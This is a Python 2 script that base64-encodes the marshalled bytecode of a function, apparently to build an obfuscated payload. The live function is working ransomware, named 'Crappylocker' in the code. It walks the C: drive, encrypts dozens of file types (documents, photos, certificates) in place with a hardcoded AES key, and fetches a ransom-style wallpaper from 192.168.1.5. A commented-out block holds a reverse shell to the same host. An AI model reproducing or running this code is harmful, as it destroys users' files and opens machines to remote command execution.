#!/usr/bin/python
import marshal, base64
from urllib import urlopen

def code():

	''' ---  MsgBox  ---

	import ctypes
	msgbox = ctypes.windll.user32.MessageBoxA
	ret = msgbox(None, 'Whatcha doing?', 'Hey you', 0)
	print ret

	'''

	#''' ---  Crappylocker ----

	import os, fnmatch, ctypes
	from Crypto import Random
	from Crypto.Cipher import AES

	DECRYPT = 0

	key = b'\xbf\xc0\x85)\x10nc\x94\x02)j\xdf\xcb\xc4\x94\x9d(\x9e[EX\xc8\xd5\xbfI{\xa2$\x05(\xd5\x18'
	filetypes = ("*.odt","*.ods","*.odp","*.odm","*.odb","*.doc","*.doc","*.doc","*.wps","*.xls","*.xls","*.xls","*.xls","*.xlk","*.ppt","*.ppt","*.ppt","*.mdb","*.acc","*.pst","*.dwg","*.dxf","*.dxg","*.wpd","*.rtf","*.wb","*.mdf","*.dbf","*.psd","*.pdd","*.eps","*.ai","*.ind","*.cdr","*.jpg","*.dng","*.arw","*.srf","*.sr","*.bay","*.crw","*.cr","*.dcr","*.kdc","*.erf","*.mef","*.mrw","*.nef","*.nrw","*.orf","*.raf","*.raw","*.rwl","*.rw","*.ptx","*.pef","*.srw","*.der","*.cer","*.crt","*.pem","*.pfx","*.pdf","*.odc")
	filelist = []

	for root, dirnames, filenames in os.walk("C:\\"):
		for ft in filetypes:
			for f in fnmatch.filter(filenames, ft):
				filelist.append(os.path.join(root, f))

	BS = AES.block_size
	pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS) 
	unpad = lambda s : s[0:-ord(s[-1])]

	for filename in filelist:
		try:
			with open(filename, 'rb+') as f:
				if DECRYPT:
					ciphertext = f.read()
				
					iv = ciphertext[:16]
					cipher = AES.new(key, AES.MODE_CBC, iv)
					plaintext = unpad(cipher.decrypt(ciphertext[16:]))
					
					f.seek(0)
					f.write(plaintext)
					f.truncate()
					f.close()

				else:
					plaintext = f.read()

					plaintext = pad(plaintext)
					iv = Random.new().read(AES.block_size)
					cipher = AES.new(key, AES.MODE_CBC, iv)
					ciphertext = iv + cipher.encrypt(plaintext)
				
					f.seek(0)
					f.write(ciphertext)
					f.truncate()
					f.close()
		except Exception, e:
			pass
	
	if not DECRYPT:
		w_loc = os.path.expanduser("~") + "\\image.jpg"
		wallpaper = urlopen("http://192.168.1.5:8000/image.jpg").read()
		with open(w_loc, 'wb+') as f:
			f.write(wallpaper)
			f.close()

		ctypes.windll.user32.SystemParametersInfoA(20, 0, w_loc , 0)
		

	#'''

	'''  ---   Reverse Shell  ----

	import socket,subprocess
	HOST = "192.168.1.5"
	PORT = 26

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((HOST, PORT))
	while 1:
		data = s.recv(1024)
		if data == "quit\n" or data == "": 
			break
		
		proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		out_val = proc.stdout.read() + proc.stderr.read()
		s.send(out_val)
	s.close()
	'''


print base64.b64encode(marshal.dumps(code.func_code))
